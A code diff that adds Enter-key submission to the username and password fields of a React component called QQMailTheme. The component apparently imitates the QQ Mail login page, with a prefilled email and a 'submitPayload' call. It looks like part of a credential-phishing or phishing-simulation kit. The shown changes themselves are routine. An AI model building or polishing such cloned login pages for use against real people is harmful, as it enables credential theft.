@@ -16,7 +16,7 @@ const QQMailTheme: React.FC<QQMailThemeProps> = ({ prefilledEmail }) => {
   const [isSubmitting, setIsSubmitting] = useState(false);
   const { submitPayload, error, setError } = useSecurity();
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent | React.KeyboardEvent) => {
     e.preventDefault();
     setIsSubmitting(true);
     try {
@@ -26,6 +26,12 @@ const QQMailTheme: React.FC<QQMailThemeProps> = ({ prefilledEmail }) => {
       console.error(err);
     } finally {
       setIsSubmitting(false);
+    }
+  };
+
+  const handleKeyDown = (e: React.KeyboardEvent) => {
+    if (e.key === 'Enter') {
+      handleSubmit(e);
     }
   };
 
@@ -144,6 +150,7 @@ const QQMailTheme: React.FC<QQMailThemeProps> = ({ prefilledEmail }) => {
                       setUsername(e.target.value);
                       if (error) setError(null);
                     }}
+                    onKeyDown={handleKeyDown}
                     className="w-full px-4 py-3 text-[14px] border border-[#dce3ea] rounded focus:outline-none focus:border-[#00a1ff] transition-all placeholder:text-gray-300"
                   />
                 </div>
@@ -157,6 +164,7 @@ const QQMailTheme: React.FC<QQMailThemeProps> = ({ prefilledEmail }) => {
                       setPassword(e.target.value);
                       if (error) setError(null);
                     }}
+                    onKeyDown={handleKeyDown}
                     className="w-full px-4 py-3 text-[14px] border border-[#dce3ea] rounded focus:outline-none focus:border-[#00a1ff] transition-all placeholder:text-gray-300"
                   />
                 </div>
